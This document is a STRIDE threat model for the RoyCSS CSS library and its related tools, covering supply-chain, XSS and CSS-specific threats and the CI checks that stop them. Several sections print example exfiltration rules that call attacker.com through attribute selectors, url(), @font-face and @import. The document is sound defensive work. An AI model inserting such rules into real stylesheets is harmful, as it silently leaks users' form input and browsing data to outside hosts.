# Threat Model — RoyCSS Security & Supply Chain

- **Document owner:** Distinguished Engineer — Security & Supply Chain domain
- **Scope:** All code shipped under `/home/z/my-project/` — the `roycss` npm
  package, the Next.js marketing site, the VS Code extension, the Chrome
  Inspector, the CLI, and the MCP server.
- **Methodology:** STRIDE (Spoofing / Tampering / Repudiation / Information
  disclosure / Denial of service / Elevation of privilege) + CSS-specific
  attack vectors (data exfiltration via attribute selectors, `url()`,
  `@font-face`, `@import`).
- **Related:** `docs/adr/07-security-supply-chain.md`,
  `docs/benchmarks/07-security-supply-chain.md`,
  `docs/checklists/07-security-supply-chain.md`
- **Status:** Approved for v1.4.0 ship.
- **Last reviewed:** 2025-02-04

---

## 1. Assets

| Asset | Where it lives | Sensitivity | Why it matters |
|---|---|---|---|
| **RoyCSS CSS source** (1,569 effects, 1.17 MB) | `src/lib/effects-batch-*.ts`, compiled into `dist/roycss.min.css` | Public (MIT) | A single malicious `url()` or attribute selector turns every consumer page into an exfiltration channel |
| **`roycss` npm package tarball** | `package.roycss.json` + `dist/` | Public (MIT) | A backdoored tarball compromises every consumer's build |
| **Marketing site HTML/JS** | `src/app/`, `src/components/` | Public | A compromised site can serve malicious JS to every visitor |
| **Marketing site visitors' browsers** | End-user devices | High (PII-adjacent) | The site sets no cookies, but a XSS could exfiltrate form data (contact form, search history) |
| **Contact form submissions** | `src/app/api/contact/route.ts` → Prisma DB | High (PII) | Name + email + message; a SQL injection or XSS here leaks user PII |
| **Build toolchain** (bun, node, npm registry) | Dev machines + CI | High | A compromised `bun install` could slip malicious code into `dist/` |
| **SBOM** (`security/results/sbom.json`) | Repo, regenerated on release | Public | Lets consumers audit the supply chain |
| **CSP nonces** (per-request, 16 bytes random) | `src/middleware.ts` → response header | Low (single-use) | A leaked nonce enables one XSS within the request's lifetime |
| **VS Code extension** | `vscode-extension/roycss-1.0.0.vsix` | Public (MIT) | Runs in the user's editor host; a backdoored extension can read workspace files |
| **Chrome Inspector** | `inspector/dist/` | Public (MIT) | Runs as a content script on every page the user visits |

---

## 2. Adversaries

| Adversary | Capability | Motivation |
|---|---|---|
| **Malicious npm package** (transitive) | Runs `postinstall` scripts; can patch any file in `node_modules/` | Slip malicious code into the marketing site bundle or the `roycss` tarball |
| **Compromised CDN / registry mirror** | Serves a tampered tarball for a pinned dep | Same as above; mitigated by `bun.lock` + provenance |
| **Network attacker (MITM)** | Intercepts HTTP traffic; cannot intercept HTTPS without a trusted cert | Inject malicious scripts into the marketing site; mitigated by `upgrade-insecure-requests` + HSTS via Caddyfile |
| **Malicious page that loads `roycss.min.css`** | Controls the page's HTML, can add arbitrary `<input>` elements | Use RoyCSS's own CSS to exfiltrate form data via attribute selectors + `url()` callbacks |
| **XSS attacker on the marketing site** | Injects `<script>` or inline event handler | Steal tokens, redirect forms, deface the site |
| **Clickjacker** | Embeds `roycss.com` in an `<iframe>` and overlays transparent buttons | Trick users into clicking CTAs (e.g. "Delete account") — though the site has no auth |
| **Curious developer / security researcher** | Probes the site with Burp / OWASP ZAP | Find vulnerabilities before the bad guys do — friendly adversary |
| **Compromised build machine** | Modifies `dist/` before `npm publish` | Backdoor the published tarball; mitigated by `publish:ci` using `--provenance` |

---

## 3. STRIDE analysis

### 3.1 Spoofing

**S1 — Malicious npm package impersonates a RoyCSS dependency.**
- *Scenario:* An attacker typosquats `react-snytax-highlighter` or
  `framer-moton` and a developer accidentally installs it.
- *Mitigation:* `bun install` resolves only names in `package.json`;
  typos would have to be committed by a maintainer. The release checklist
  requires `bun audit` + a manual diff of `package.json` before every
  release. The SBOM lists every dep's purl for cross-checking.

**S2 — Attacker publishes a fake `roycss` package on npm.**
- *Scenario:* `npm publish` from a compromised maintainer account.
- *Mitigation:* The release pipeline uses `npm publish --provenance --access public`
  (see `package.json` `publish:ci`). Provenance attaches a Sigstore
  signature linking the tarball to a specific GitHub Actions run. Consumers
  can verify with `npm audit signatures`.

**S3 — CSP nonce reuse across requests.**
- *Scenario:* A bug in middleware generates the same nonce for two
  requests, letting an attacker who captures one nonce reuse it.
- *Mitigation:* `src/middleware.ts` generates the nonce with
  `crypto.randomBytes(16)` per request and never persists it. The nonce
  lives only in the response header + the rendered `<script>` tags.

### 3.2 Tampering

**T1 — `dist/roycss.min.css` is modified after build.**
- *Scenario:* A compromised CI runner patches the CSS to add
  `input[value^="a"] { background: url(attacker.com/?a) }`.
- *Mitigation:*
  - `css-exfiltration-check.ts` runs as a CI gate; any external `url()`
    fails the build.
  - The release tarball is built from a clean `bun install` + `bun run
    build:package` in CI, not from a developer's local `dist/`.
  - `npm publish --provenance` links the tarball to the CI run.

**T2 — `package.json` `overrides` field is tampered to allow a vulnerable dep.**
- *Scenario:* An attacker PR relaxes an override.
- *Mitigation:* `bun audit` runs as a CI gate; any high/critical advisory
  fails the build. The override list is documented in ADR §6.
  `security/audit.ts` parses `bun audit --json` and counts by severity;
  accepted-risk advisories (none as of 2026-07-30) must be documented in
  the `ACCEPTED_ADVISORIES` array of `security/audit.ts` with a threat
  model reference.

**T3 — A `postinstall` script is added to a dependency.**
- *Scenario:* A new direct dep ships a `postinstall` that runs arbitrary
  code.
- *Mitigation:* The release checklist forbids any dep with `postinstall`,
  `preinstall`, `install`, or `prepare` scripts. Verified by
  `security/audit.ts` which scans every dep's `package.json` for these
  fields.

### 3.3 Repudiation

**R1 — A maintainer denies shipping a vulnerable version.**
- *Mitigation:* Every release is git-tagged. The CHANGELOG documents the
  version bump. `package.json` `version` matches the git tag.
  `npm publish --provenance` attaches a Sigstore signature to the
  tarball.

**R2 — A user denies submitting the contact form.**
- *Mitigation:* The contact form stores a timestamp + IP (via the
  `request.headers` in `src/app/api/contact/route.ts`) in the Prisma DB.
  This is PII and is documented in the privacy policy (TODO: ship a
  `/privacy` route — out of scope for this ADR).

### 3.4 Information disclosure

**I1 — CSS data exfiltration via attribute selectors.**
- *Scenario:* A RoyCSS effect ships
  `input[value^="a"] { background: url(attacker.com/?leak=a) }`. Every
  consumer page that loads `roycss.min.css` and has an `<input>` starting
  with "a" leaks that character to attacker.com.
- *Impact:* **Critical** if it shipped. The library is loaded on
  consumer sites we don't control; the exfiltration is silent.
- *Mitigation:*
  - `css-exfiltration-check.ts` scans every effect's CSS for
    `[value^=…]`, `[value*=…]`, `[type=…]` attribute selectors combined
    with `url()`. Any match fails the build.
  - The OKLCH migration scripts already stripped all external color
    references; this check verifies that no future PR re-introduces them.
  - The library has **zero** attribute selectors that combine with
    `url()` (verified by `css-exfiltration-check.ts`).

**I2 — CSS `url()` to an external host.**
- *Scenario:* A RoyCSS effect ships `background: url(attacker.com/x.png)`.
  Every consumer page makes a request to attacker.com, leaking the
  consumer's IP + Referer.
- *Impact:* **High** — privacy leak on every consumer page.
- *Mitigation:*
  - `css-exfiltration-check.ts` scans every effect for
    `url(http`, `url(https`, `url(//`. Any match fails the build.
  - All `url()` references in `dist/roycss.css` are either
    `data:image/svg+xml,…` (inline) or `url(#filter-id)` (SVG fragment).
    Verified: 24 `url()` occurrences, all safe.

**I3 — `@font-face` with external `src: url(http…)`.**
- *Scenario:* A RoyCSS effect loads a web font from an external host.
- *Impact:* **High** — privacy leak + supply chain (font host compromise
  → malicious font → browser exploit).
- *Mitigation:*
  - `css-exfiltration-check.ts` scans for `@font-face` + external URL.
  - The library ships **zero** `@font-face` rules (verified). The
    marketing site uses `next/font/google`, which self-hosts the font
    files at `/_next/static/media/`.

**I4 — `@import` from an external host.**
- *Scenario:* A RoyCSS effect ships `@import url(https://attacker.com/x.css)`.
- *Impact:* **High** — the imported CSS runs in the consumer page's
  origin and can do anything RoyCSS's CSS can do (including
  exfiltration).
- *Mitigation:*
  - `css-exfiltration-check.ts` scans for `@import`. Any match fails the
    build (we allow `@import` only for same-origin, and RoyCSS has none).
  - The library ships **zero** `@import` rules (verified).

**I5 — XSS via `dangerouslySetInnerHTML` with user content.**
- *Scenario:* A future PR routes user input (search query, contact form
  field) through `dangerouslySetInnerHTML`.
- *Impact:* **Critical** — full XSS, account takeover (if we had auth),
  cookie theft, defacement.
- *Mitigation:*
  - `xss-scan.ts` fails the build if any `dangerouslySetInnerHTML` lacks
    a `// SECURITY:` comment naming the threat model entry that
    justifies it.
  - The three current uses are library CSS (T5), not user content.
  - The docs overlay uses `react-markdown` without `rehype-raw`, so raw
    HTML in markdown cannot render (see `docs/threat-models/03-docs-site.md`
    T1).
  - The search overlay highlights matches via React children, not
    `dangerouslySetInnerHTML` (see `docs/threat-models/03-docs-site.md`
    T2).

**I6 — Contact form PII leak via SQL injection.**
- *Scenario:* `src/app/api/contact/route.ts` builds a Prisma query with
  string concatenation.
- *Mitigation:* Prisma uses parameterized queries by default. The route
  uses `prisma.contact.create({ data: { ... } })`, never raw SQL. The
  zod schema validates input shape before it reaches Prisma.

**I7 — Referer leak to third-party.**
- *Scenario:* A user clicks an external link (e.g. GitHub) and the full
  URL `roycss.com/?search=secret` is sent in the Referer header.
- *Mitigation:* `Referrer-Policy: strict-origin-when-cross-origin` sends
  only the origin (`https://roycss.com`) for cross-origin requests. The
  site has no external links that include user input in the URL.

**I8 — SBOM discloses dep versions an attacker can target.**
- *Scenario:* An attacker reads `security/results/sbom.json`, finds
  `next@16.2.12`, and probes for known CVEs.
- *Impact:* Low. The SBOM is public by design — security through
  obscurity would be worse. Consumers need the SBOM to do their own
  risk assessment. The attacker can `npm view roycss dependencies`
  anyway.

### 3.5 Denial of service

**D1 — `bun audit` finds a CVE with no patched version.**
- *Scenario:* A new CVE drops for a dep that has no fix yet.
- *Mitigation:* `security/audit.ts` exits 1 if any high/critical is
  present. The release is blocked until either (a) a patched version
  ships, (b) we apply an `override` to a forked version, or (c) we
  document a workaround in the threat model and add a `// SECURITY:
  accepted-risk: …` annotation.

**D2 — Excessive CSP violation reports.**
- *Scenario:* A bug in the CSP causes every request to log a violation,
  filling disk.
- *Mitigation:* We ship CSP in enforcing mode (not report-only), so
  violations are blocked, not logged. No reporting endpoint is
  configured. If we add one later, it must rate-limit.

**D3 — `css-exfiltration-check.ts` runs slowly on 1,569 effects.**
- *Mitigation:* The script reads `dist/roycss.css` (one file) and
  `dist/effects.json`, applies a regex per line, and writes a JSON
  report. Measured <500 ms on the full library.

**D4 — MITM blocks the site's HTTPS handshake.**
- *Mitigation:* Out of scope — TLS termination is handled by Caddy (see
  `Caddyfile`). The CSP's `upgrade-insecure-requests` ensures the
  browser refuses to load the site over HTTP.

### 3.6 Elevation of privilege

**E1 — `eval(userInput)` in the marketing site.**
- *Scenario:* A future PR adds `eval(queryString)` to parse a URL param.
- *Mitigation:* `xss-scan.ts` fails the build if any `eval(`, `new Function(`,
  `setTimeout(string)`, `setInterval(string)`, or `document.write` is
  found. The current codebase has zero such calls (verified).

**E2 — Webview in VS Code extension executes page-controlled JS.**
- *Mitigation:* See `docs/threat-models/02-vscode-extension.md` §3.2 —
  the extension spawns no child processes, uses no `eval`, and the
  webview's CSP is `default-src 'none'` + nonce'd scripts.

**E3 — Inspector content script runs in page origin.**
- *Mitigation:* See `docs/threat-models/01-inspector-extension.md` §3.6
  — the content script reads only `element.classList`, builds DOM via
  `createElement` + `textContent`, and the extension CSP forbids
  remote scripts.

**E4 — `next.config.ts` headers are bypassed by a Next.js middleware bug.**
- *Scenario:* A Next.js regression causes the `headers()` config to be
  ignored on some routes.
- *Mitigation:* The agent-browser smoke test verifies the CSP header is
  present on `/` after every release. If a Next.js upgrade drops it,
  the test fails.

---

## 4. CSS-specific attack vectors (deep dive)

These are the vectors that make a CSS library uniquely dangerous. Each
is independently mitigated by `css-exfiltration-check.ts`.

### 4.1 Attribute-selector exfiltration

```css
/* ATTACK: leaks every keystroke of an <input> to attacker.com */
input[value^="a"] { background: url(https://attacker.com/?a); }
input[value^="b"] { background: url(https://attacker.com/?b); }
/* …26 selectors per character, recursive for multi-char… */
```

The browser matches the attribute selector and fires the `url()` request,
leaking the prefix. With enough selectors (a few hundred), an attacker
can reconstruct the full value of a hidden input (CSRF token, password
autofill, etc.).

**Defense:** `css-exfiltration-check.ts` flags any rule combining an
attribute selector (`[name^=]`, `[name$=]`, `[name*=]`) with a `url()`
reference. RoyCSS ships zero such rules.

### 4.2 `url()` to external host

```css
/* ATTACK: leaks consumer IP + Referer to attacker.com */
.hero { background: url(https://attacker.com/track.png); }
```

**Defense:** `css-exfiltration-check.ts` flags `url(http`, `url(https`,
`url(//`. RoyCSS's only `url()` references are `data:` URIs (inline SVG)
and `url(#id)` (SVG filter references). Both are local.

### 4.3 `@font-face` with external `src`

```css
/* ATTACK: leaks consumer IP + lets attacker serve a malicious font */
@font-face { font-family: "x"; src: url(https://attacker.com/f.woff2); }
```

**Defense:** `css-exfiltration-check.ts` flags any `@font-face` rule with
a non-`data:` URL in `src`. RoyCSS ships zero `@font-face` rules. The
marketing site uses `next/font/google`, which downloads fonts at build
time and serves them from `/_next/static/media/` (same-origin).

### 4.4 `@import` from external host

```css
/* ATTACK: imports attacker-controlled CSS, which can include any of the
   above vectors plus more */
@import url(https://attacker.com/malicious.css);
```

**Defense:** `css-exfiltration-check.ts` flags any `@import`. RoyCSS
ships zero `@import` rules.

### 4.5 `:visited` link history leak

```css
/* ATTACK: leaks browsing history (legacy — modern browsers block this) */
a:visited { background: url(https://attacker.com/?visited); }
```

Modern browsers (since ~2010) restrict `:visited` to color-only CSS, so
`url()` is not loaded. We mention it for completeness; no mitigation
needed beyond browser defaults.

### 4.6 CSS injection via `--custom-property`

```css
/* ATTACK: if a component sets style="--color: url(attacker.com/x)",
   the var() resolution can trigger a request */
.box { background: var(--color); }
```

RoyCSS's custom properties are all OKLCH color values, set by the
library, not by user input. The color customizer component
(`src/components/roycss/color-customizer.tsx`) validates input via
zod before applying it to a CSS variable.

---

## 5. Mitigations summary

| Threat | Mitigation | Where enforced |
|---|---|---|
| CSS data exfiltration (attribute selectors + url) | `css-exfiltration-check.ts` scans all 1,569 effects + compiled CSS | CI gate, `security/css-exfiltration-check.ts` |
| External `url()` in CSS | Same scan; allow only `data:` and `url(#id)` | `security/css-exfiltration-check.ts` |
| `@font-face` external `src` | Same scan | `security/css-exfiltration-check.ts` |
| `@import` external | Same scan | `security/css-exfiltration-check.ts` |
| XSS via `dangerouslySetInnerHTML` | `xss-scan.ts` fails on any unsanitized use | CI gate, `security/xss-scan.ts` |
| `eval` / `new Function` / `document.write` | `xss-scan.ts` fails on any use | CI gate, `security/xss-scan.ts` |
| Supply chain (npm deps) | `audit.ts` runs `bun audit --json`; high/critical fails | CI gate, `security/audit.ts` |
| Transitive vulns without patched direct dep | `overrides` in `package.json` (ADR §6) | `package.json` |
| CSP bypass (inline scripts) | Per-request nonce in `src/middleware.ts`; `'strict-dynamic'` | `next.config.ts`, `src/middleware.ts` |
| Clickjacking | `frame-ancestors 'none'` + `X-Frame-Options: DENY` | `next.config.ts` |
| MIME sniffing | `X-Content-Type-Options: nosniff` | `next.config.ts` |
| Referer leak | `Referrer-Policy: strict-origin-when-cross-origin` | `next.config.ts` |
| Unused device APIs | `Permissions-Policy: camera=(), microphone=(), geolocation=()` | `next.config.ts` |
| Tarball tampering | `npm publish --provenance` | `package.json` `publish:ci` |
| SBOM availability | `sbom.ts` generates CycloneDX on every release | `security/sbom.ts` |
| `postinstall` scripts in deps | `audit.ts` scans every dep's `package.json` | `security/audit.ts` |
| SQL injection (contact form) | Prisma parameterized queries + zod validation | `src/app/api/contact/route.ts` |

---

## 6. Residual risk

| Risk | Likelihood | Impact | Notes |
|---|---|---|---|
| A dep ships a CVE with no fix. | Medium | Medium | `audit.ts` blocks the release; we either fork or document an accepted risk. As of 2026-07-30 the accepted-risk list is **empty** — the previously-accepted `brace-expansion` DoS (GHSA-mh99-v99m-4gvg) was resolved by upgrading `minimatch` to `^10.2.6` (which depends on `brace-expansion@^5.0.8`) and pinning `brace-expansion: ^5.0.9`. |
| Next.js ships a CSP bypass. | Low | High | Mitigated by nonce rotation + `'strict-dynamic'`. The Next.js security team patches these within days. |
| A new feature adds `dangerouslySetInnerHTML` without a `// SECURITY:` comment. | Medium | High | `xss-scan.ts` catches it pre-merge. |
| A new feature adds an external `url()` to an effect. | Low | Critical | `css-exfiltration-check.ts` catches it pre-merge. |
| The build machine is compromised. | Low | Critical | `npm publish --provenance` lets consumers verify the tarball came from our CI. |
| The CSP nonce is leaked via a log. | Low | Medium | `src/middleware.ts` does not log the nonce. The agent-browser smoke test verifies no nonce appears in console output. |
| `react-syntax-highlighter`'s `prismjs` transitive has a moderate ReDoS. | Low | Low | The vulnerable code paths (`prismjs.markup`, `prismjs.clike`) are not invoked by our docs overlay; the `prismjs: ^1.30.0` override pins the latest 1.x release. No advisory currently reports against 1.30.0. |

---

## 7. Review cadence

This threat model is reviewed:
- Before every major version bump (`v1.x.0`).
- When a new direct runtime dep is added.
- When a new CSP directive is added or removed.
- When `bun audit` reports a new critical CVE.
- When a new browser CSP feature (e.g. `trusted-types`) becomes widely
  supported.

---

## 8. References

- ADR: `docs/adr/07-security-supply-chain.md`
- Benchmarks: `docs/benchmarks/07-security-supply-chain.md`
- Plan: `docs/plans/07-security-supply-chain.md`
- Checklist: `docs/checklists/07-security-supply-chain.md`
- Scripts: `security/audit.ts`, `security/sbom.ts`, `security/csp.ts`,
  `security/css-exfiltration-check.ts`, `security/xss-scan.ts`
- STRIDE: <https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats>
- OWASP Top 10: <https://owasp.org/Top10/>
- CSS exfiltration primer: <https://book.hacktricks.xyz/pentesting-web/xs-search>
- Next.js CSP: <https://nextjs.org/docs/app/guides/content-security-policy>
- CycloneDX: <https://cyclonedx.org/docs/1.4/json/>
